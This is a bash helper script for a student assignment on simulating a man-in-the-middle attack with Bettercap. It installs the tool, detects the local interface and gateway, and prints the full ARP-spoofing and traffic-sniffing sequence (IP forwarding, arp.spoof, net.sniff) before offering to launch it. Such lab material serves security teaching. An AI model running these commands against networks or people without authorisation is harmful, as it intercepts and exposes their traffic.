#!/bin/bash
# Assignment 02: MITM Attack Simulation using Bettercap
# Interactive Helper & Verification Script

echo "=========================================================="
echo "   Assignment 02: MITM Attack Simulation Setup (Bettercap)"
echo "=========================================================="

# Check and install Bettercap
if ! command -v bettercap &> /dev/null; then
    echo "[*] Bettercap not found. Installing bettercap..."
    sudo apt update && sudo apt install -y bettercap
else
    echo "[+] Bettercap is already installed."
fi

# Detect default interface
IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -n 1)
if [ -z "$IFACE" ]; then
    IFACE="eth0"
fi

MY_IP=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)
GATEWAY_IP=$(ip route | grep default | awk '{print $3}')

echo ""
echo "[*] Detected Network Interface : $IFACE"
echo "[*] Kali / Local IP            : $MY_IP"
echo "[*] Gateway / Router IP        : $GATEWAY_IP"
echo ""
echo "=========================================================="
echo "Demonstration Steps to Explain to Examiner:"
echo " 1. Enable packet forwarding in Kali kernel:"
echo "    sudo sysctl -w net.ipv4.ip_forward=1"
echo ""
echo " 2. Launch Bettercap on active interface:"
echo "    sudo bettercap -iface $IFACE"
echo ""
echo " 3. Inside Bettercap prompt, run:"
echo "    > net.probe on"
echo "    > net.recon on"
echo "    > set arp.spoof.fullduplex true"
echo "    > net.show"
echo "    > set arp.spoof.targets <TARGET_IP>"
echo "    > arp.spoof on"
echo "    > set net.sniff.local true"
echo "    > net.sniff on"
echo "=========================================================="
read -p "Do you want to launch Bettercap now? (y/n): " choice
if [[ "$choice" =~ ^[Yy]$ ]]; then
    sudo sysctl -w net.ipv4.ip_forward=1
    sudo bettercap -iface "$IFACE"
fi

